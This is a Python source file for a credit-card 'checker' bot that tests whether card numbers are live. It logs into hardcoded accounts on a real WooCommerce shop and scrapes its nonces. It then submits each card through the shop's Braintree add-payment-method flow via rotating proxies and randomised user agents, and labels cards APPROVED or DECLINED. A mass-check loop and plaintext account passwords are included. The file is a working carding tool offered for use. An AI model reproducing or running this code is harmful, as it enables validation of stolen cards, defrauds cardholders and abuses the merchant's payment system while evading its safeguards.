import httpx
import re
import random
import base64
import asyncio
import time
import os
import json
from user_agent import generate_user_agent

class BraintreeChecker:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.current_account_index = 0
        self.current_proxy_index = 0
        self.session_delay = 1
        self.bin_api_retries = 3
        self.card_check_retries = 2
        self.bin_apis = [
            {
                'name': 'Binlist.net',
                'url': 'https://lookup.binlist.net/{}',
                'parse_func': 'parse_binlist'
            },
            {
                'name': 'BIN Checker',
                'url': 'https://bin-checker.net/api/{}',
                'parse_func': 'parse_binchecker'
            },
            {
                'name': 'BINlist API',
                'url': 'https://api.bincodes.com/bin/?format=json&api_key=free&bin={}',
                'parse_func': 'parse_bincodes'
            },
            {
                'name': 'Bank Lookup',
                'url': 'https://bins.su/{}',
                'parse_func': 'parse_bins_su'
            }
        ]
        
    def load_accounts(self):
        """Load accounts from the code or file"""
        self.accounts = [
            {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
            {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
            {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
            {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
            {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
            {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
            {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"},
            {"email": "xavoje5906@filipx.com", "password": "Simon99007"}, 
            {"email": "vamenuky@denipl.com", "password": "Simon99007"},
            {"email": "mowuraza@denipl.com", "password": "Simon99007"}    
        ]
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    def get_next_account(self):
        """Get next account with rotation"""
        if not self.accounts:
            return None
        
        account = self.accounts[self.current_account_index]
        self.current_account_index = (self.current_account_index + 1) % len(self.accounts)
        return account
    
    def get_next_proxy(self):
        """Get next proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str):
        """Parse proxy string to httpx format"""
        try:
            if ":" in proxy_str:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    # Format: ip:port:username:password
                    ip, port, username, password = parts
                    return f"http://{username}:{password}@{ip}:{port}"
                elif len(parts) == 2:
                    # Format: ip:port
                    ip, port = parts
                    return f"http://{ip}:{port}"
        except:
            pass
        return None
    
    def parse_binlist(self, data):
        """Parse binlist.net API response"""
        return {
            'bank': data.get('bank', {}).get('name', 'Unavailable'),
            'country': data.get('country', {}).get('name', 'Unknown'),
            'brand': data.get('scheme', 'Unknown').upper(),
            'type': data.get('type', 'Unknown').upper(),
            'level': 'UNKNOWN',
            'emoji': self.get_country_emoji(data.get('country', {}).get('alpha2', ''))
        }
    
    def parse_binchecker(self, data):
        """Parse bin-checker.net API response"""
        return {
            'bank': data.get('bank', {}).get('name', 'Unavailable'),
            'country': data.get('country', {}).get('name', 'Unknown'),
            'brand': data.get('scheme', 'Unknown').upper(),
            'type': data.get('type', 'Unknown').upper(),
            'level': data.get('level', 'UNKNOWN').upper(),
            'emoji': self.get_country_emoji(data.get('country', {}).get('code', ''))
        }
    
    def parse_bincodes(self, data):
        """Parse bincodes.com API response"""
        return {
            'bank': data.get('bank', 'Unavailable'),
            'country': data.get('country', 'Unknown'),
            'brand': data.get('card', 'Unknown').upper(),
            'type': data.get('type', 'Unknown').upper(),
            'level': data.get('level', 'UNKNOWN').upper(),
            'emoji': self.get_country_emoji(data.get('countrycode', ''))
        }
    
    def parse_bins_su(self, data):
        """Parse bins.su API response"""
        if isinstance(data, list) and len(data) > 0:
            item = data[0]
            return {
                'bank': item.get('bank', 'Unavailable'),
                'country': item.get('country', 'Unknown'),
                'brand': item.get('brand', 'Unknown').upper(),
                'type': item.get('type', 'Unknown').upper(),
                'level': item.get('level', 'UNKNOWN').upper(),
                'emoji': self.get_country_emoji(item.get('countrycode', ''))
            }
        return None
    
    async def get_bin_info_reliable(self, bin_number):
        """Enhanced BIN lookup using multiple APIs with fallback"""
        if not bin_number or len(bin_number) < 6:
            return self.get_fallback_bin_info(bin_number)
        
        max_retries = self.bin_api_retries
        bin_code = bin_number[:6]
        
        # Try each API in order
        for api_config in self.bin_apis:
            for attempt in range(max_retries):
                try:
                    print(f"🔍 Attempt {attempt + 1}/{max_retries} with {api_config['name']}...")
                    
                    api_url = api_config['url'].format(bin_code)
                    
                    headers = {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    }
                    
                    # Special headers for specific APIs
                    if 'binlist' in api_url:
                        headers['Accept-Version'] = '3'
                    
                    print(f"🔄 Calling {api_config['name']}: {api_url}")
                    
                    # Get proxy for BIN lookup with rotation
                    proxy_str = self.get_next_proxy()
                    proxies = self.parse_proxy(proxy_str) if proxy_str else None
                    
                    # Configure proxy if available
                    transport = None
                    if proxies:
                        transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=2)
                        print(f"🔄 Using proxy for BIN lookup: {proxy_str}")
                    
                    async with httpx.AsyncClient(
                        timeout=15.0, 
                        verify=False,
                        transport=transport
                    ) as client:
                        response = await client.get(api_url, headers=headers)
                        
                        if response.status_code == 200:
                            data = response.json()
                            print(f"📡 Raw {api_config['name']} response: {data}")
                            
                            # Parse using the appropriate function
                            parse_func = getattr(self, api_config['parse_func'])
                            bin_info = parse_func(data)
                            
                            if bin_info:
                                # Clean up the values
                                for key in ['bank', 'country', 'brand', 'type', 'level']:
                                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null', 'Unavailable']:
                                        if key == 'level':
                                            bin_info[key] = 'STANDARD'
                                        else:
                                            bin_info[key] = 'Unknown'
                                
                                # Map type to more readable format
                                type_mapping = {
                                    'CREDIT': 'CREDIT',
                                    'DEBIT': 'DEBIT', 
                                    'CREDIT/DEBIT': 'CREDIT/DEBIT'
                                }
                                if bin_info['type'] in type_mapping:
                                    bin_info['type'] = type_mapping[bin_info['type']]
                                
                                # Validate if we got real BIN data (not fallback)
                                if (bin_info['bank'] not in ['Unavailable', 'Unknown', 'VISA BANK', 'MASTERCARD BANK'] and 
                                    bin_info['brand'] != 'Unknown' and
                                    bin_info['country'] not in ['UNITED STATES', 'Unknown']):
                                    print(f"✅ REAL BIN Info captured from {api_config['name']}: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}")
                                    print(f"✅ Bank: {bin_info.get('bank', 'UNKNOWN')} | Country: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}")
                                    return bin_info
                                else:
                                    print(f"⚠️ Got incomplete data from {api_config['name']}, trying next API...")
                                    break  # Break retry loop for this API
                            
                        elif response.status_code == 429:
                            print(f"⚠️ Rate limit hit on {api_config['name']}, trying next API...")
                            break
                        else:
                            print(f"⚠️ {api_config['name']} returned status {response.status_code}")
                    
                    # If API call failed, wait and retry
                    if attempt < max_retries - 1:
                        wait_time = (attempt + 1) * 2
                        print(f"⏳ Waiting {wait_time} seconds before retry...")
                        await asyncio.sleep(wait_time)
                        
                except httpx.TimeoutException:
                    print(f"⚠️ {api_config['name']} attempt {attempt + 1} timed out")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
                except httpx.NetworkError:
                    print(f"⚠️ {api_config['name']} attempt {attempt + 1} network error")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
                except Exception as e:
                    print(f"⚠️ {api_config['name']} attempt {attempt + 1} failed: {str(e)}")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
        
        # If all APIs fail, use fallback but log it
        print("❌ All BIN APIs failed after all retries, using fallback BIN info")
        return self.get_fallback_bin_info(bin_number)
    
    def get_country_emoji(self, country_code):
        """Convert country code to emoji"""
        if not country_code or len(country_code) != 2:
            return '🏳️'
        
        try:
            # Convert to uppercase and get emoji
            country_code = country_code.upper()
            
            # Country code to emoji mapping
            flag_emoji = ''.join(chr(127397 + ord(char)) for char in country_code)
            return flag_emoji
        except:
            return '🏳️'

    def get_fallback_bin_info(self, bin_number):
        """Fallback BIN info when API fails"""
        if not bin_number or len(bin_number) < 6:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown', 
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
        
        # Enhanced pattern matching with more brands
        if bin_number.startswith('4'):
            brand = 'VISA'
            bank = 'VISA BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
            bank = 'MASTERCARD BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
            bank = 'AMERICAN EXPRESS'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('36') or bin_number.startswith('38') or bin_number.startswith('39'):
            brand = 'DINERS CLUB'
            bank = 'DINERS CLUB'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
            bank = 'DISCOVER BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('35'):
            brand = 'JCB'
            bank = 'JCB CO. LTD'
            country = 'JAPAN'
            emoji = '🇯🇵'
        elif bin_number.startswith('62'):
            brand = 'UNIONPAY'
            bank = 'CHINA UNIONPAY'
            country = 'CHINA'
            emoji = '🇨🇳'
        else:
            brand = 'UNKNOWN'
            bank = 'UNKNOWN BANK'
            country = 'UNKNOWN'
            emoji = '🏳️'
        
        return {
            'bank': bank,
            'country': country,
            'brand': brand,
            'type': 'CREDIT/DEBIT',
            'level': 'STANDARD',
            'emoji': emoji
        }

    def determine_result_from_response(self, response_message):
        """Determine if response should be APPROVED or DECLINED based on message"""
        response_lower = response_message.lower()
        
        # APPROVED scenarios - if ANY of these keywords appear in the response, it's APPROVED
        approved_indicators = [
            'payment method successfully added',
            'payment method added',
            'successfully added',
            'cvv',  # If "cvv" appears anywhere in response
            'security code', 
            'cvc',
            'avs',  # If "avs" appears anywhere in response
            '2010',  # If "2010" appears anywhere in response
            '2011',  # If "2011" appears anywhere in response
            '3d secure',
            'authentication required',
            'insufficient funds'  # If "insufficient funds" appears anywhere in response
        ]
        
        # Check if any approved indicator is present ANYWHERE in the response
        for indicator in approved_indicators:
            if indicator in response_lower:
                return 'APPROVED'
        
        # DECLINED scenarios
        declined_indicators = [
            'invalid card number',
            'expired card',
            'stolen card',
            'lost card',
            'pick up card',
            'no such issuer',
            'invalid merchant',
            'restricted card',
            'closed card',
            '2108',  # Closed Card code
            '81703',  # Credit card type not accepted
            'credit card type is not accepted',
            'do not honor'
        ]
        
        for indicator in declined_indicators:
            if indicator in response_lower:
                return 'DECLINED'
        
        # Default to DECLINED if no specific indicators found
        return 'DECLINED'

    def format_response_message(self, response_message):
        """Format the response message properly without DECLINED prefix"""
        # Remove any "DECLINED - " prefix if present
        if response_message.startswith('DECLINED - '):
            response_message = response_message.replace('DECLINED - ', '')
        
        # Remove any "❌ DECLINED - " prefix if present  
        if response_message.startswith('❌ DECLINED - '):
            response_message = response_message.replace('❌ DECLINED - ', '')
            
        return response_message
    
    async def check_single_card(self, card_line):
        """Check a single card with account rotation - IMPROVED with reliable BIN lookup first"""
        start_time = time.time()
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            n, mm, yy, cvc = parts
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" not in yy:
                yy = f'20{yy}'
            
            # STEP 1: GET BIN INFO FIRST using multiple APIs
            print("🔍 Getting BIN information from multiple APIs...")
            bin_info = await self.get_bin_info_reliable(n[:6])
            
            # Check if we got real BIN data or fallback
            if bin_info['bank'] in ['VISA BANK', 'MASTERCARD BANK', 'Unavailable', 'Unknown']:
                print("⚠️ Using fallback BIN data - All BIN APIs failed")
            else:
                print(f"✅ REAL BIN Info successfully captured: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}")
                print(f"✅ Bank: {bin_info.get('bank', 'UNKNOWN')} | Country: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}")
            
            # Only proceed with card checking after BIN info is secured
            print("🔄 Proceeding with card verification...")
            
            # Get account and proxy
            account = self.get_next_account()
            if not account:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No accounts available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Add retry logic for card processing
            for retry_attempt in range(self.card_check_retries):
                try:
                    proxy_str = self.get_next_proxy()
                    proxies = self.parse_proxy(proxy_str) if proxy_str else None
                    
                    # Process card with retry logic
                    result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
                    elapsed_time = time.time() - start_time
                    
                    # Format the response message without DECLINED prefix
                    formatted_response = self.format_response_message(response_message)
                    
                    # Format result based on response
                    if result == "APPROVED":
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {formatted_response}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {formatted_response}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                except (httpx.TimeoutException, httpx.NetworkError, httpx.RemoteProtocolError) as e:
                    if retry_attempt < self.card_check_retries - 1:
                        print(f"🔄 Card check attempt {retry_attempt + 1} failed with network error: {str(e)}")
                        print(f"⏳ Retrying card check in {retry_attempt + 2} seconds...")
                        await asyncio.sleep(retry_attempt + 2)
                        continue
                    else:
                        # If all retries failed, return the error
                        elapsed_time = time.time() - start_time
                        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {self.card_check_retries} retries: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                except Exception as e:
                    # For other exceptions, don't retry
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            # Even if processing fails, we still have BIN info from the reliable lookup
            bin_info = await self.get_bin_info_reliable(n[:6]) if 'n' in locals() else self.get_fallback_bin_info('')
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
        """Process a single card with given account and proxy - USING EXACT finalb3mass11.py LOGIC"""
        try:
            user = generate_user_agent()
            
            # Configure proxy if available
            transport = None
            if proxies:
                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
            
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=30,
                transport=transport
            ) as client:
                # STEP 1: Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/')
                
                # Find login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    return 'DECLINED', 'Could not find login nonce'
                
                nonce = login_nonce_match.group(1)

                # STEP 2: Login
                login_data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    data=login_data
                )
                
                # Check if login was successful
                if not ('Log out' in response.text or 'My Account' in response.text):
                    return 'DECLINED', 'Login failed'

                # STEP 3: Get payment page
                response = await client.get('https://www.tea-and-coffee.com/account/add-payment-method-custom/')

                # Find payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    return 'DECLINED', 'Could not find payment nonce'
                
                nonce = payment_nonce_match.group(1)

                # Find client nonce
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    return 'DECLINED', 'Could not find client token nonce'
                
                client_nonce = client_nonce_match.group(1)

                # STEP 4: Get client token
                token_data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    data=token_data
                )
                
                if response.status_code != 200:
                    return 'DECLINED', f'Client token request failed with status {response.status_code}'
                    
                token_response = response.json()
                if 'data' not in token_response:
                    return 'DECLINED', 'No data in client token response'
                    
                enc = token_response['data']
                try:
                    dec = base64.b64decode(enc).decode('utf-8')
                except:
                    return 'DECLINED', 'Failed to decode client token'
                
                # Find authorization fingerprint
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    return 'DECLINED', 'Could not find authorization fingerprint in client token'
                
                authorization = authorization_match[0]

                # STEP 5: Tokenize card
                braintree_headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': user,
                }

                tokenize_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }
                
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=braintree_headers,
                    json=tokenize_data
                )

                if response.status_code != 200:
                    return 'DECLINED', f'Tokenization failed with status {response.status_code}'

                tokenize_response = response.json()
                if 'data' not in tokenize_response or 'tokenizeCreditCard' not in tokenize_response['data']:
                    if 'errors' in tokenize_response:
                        error_msg = tokenize_response['errors'][0].get('message', 'Tokenization failed')
                        # Determine result based on the actual error message
                        result = self.determine_result_from_response(error_msg)
                        return result, f'{error_msg}'
                    return 'DECLINED', 'Tokenization failed - no token in response'
                    
                tok = tokenize_response['data']['tokenizeCreditCard']['token']

                # STEP 6: Process payment - EXACT LOGIC FROM finalb3mass11.py
                payment_headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    'user-agent': user,
                }

                # Determine card type
                card_type = "visa" if cc.startswith("4") else "mastercard" if cc.startswith("5") else "discover"

                payment_data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': card_type,
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '20.78',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': '/account/add-payment-method-custom/',
                    'woocommerce_add_payment_method': '1',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=payment_headers,
                    data=payment_data,
                    follow_redirects=True
                )
                
                # EXACT RESPONSE PARSING FROM finalb3mass11.py
                response_text = response.text

                # Check for success
                if any(success_msg in response_text for success_msg in [
                    'Nice! New payment method added', 
                    'Payment method successfully added',
                    'Payment method added',
                    'successfully added'
                ]):
                    return 'APPROVED', 'Payment method added successfully'
                
                # Check for specific error patterns
                error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
                error_match = re.search(error_pattern, response_text, re.DOTALL)
                
                if error_match:
                    error_msg = error_match.group(1).strip()
                    result = self.determine_result_from_response(error_msg)
                    return result, f'{error_msg}'
                
                # Check for generic WooCommerce errors
                if 'woocommerce-error' in response_text:
                    return "DECLINED", "Payment Failed"
                
                # If we got a 302 but ended up here, check final URL
                if 'account' in str(response.url) and 'payment' not in str(response.url):
                    return "DECLINED", "Redirected to account page (likely auth issue)"
                    
                return "DECLINED", "Unknown response"

        except httpx.TimeoutException:
            return 'DECLINED', 'Request timeout'
        except httpx.NetworkError:
            return 'DECLINED', 'Network connection failed'
        except Exception as e:
            return 'DECLINED', f'{str(e)}'

# Global checker instance
braintree_checker = BraintreeChecker()

def initialize_braintree():
    """Initialize the Braintree checker"""
    braintree_checker.load_accounts()
    braintree_checker.load_proxies()
    return "✅ Braintree checker initialized"

async def check_card_braintree(cc_line):
    """Main function to check card via Braintree (single card)"""
    return await braintree_checker.check_single_card(cc_line)

async def check_cards_braintree(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = await check_card_braintree(cc_line)
        results.append(result)
        await asyncio.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Initialize the checker
    initialize_braintree()
    
    # Test with a single card
    async def test():
        test_cc = "4111111111111111|12|2025|123"
        print("Testing Braintree checker...")
        result = await check_card_braintree(test_cc)
        print(result)
    
    asyncio.run(test())
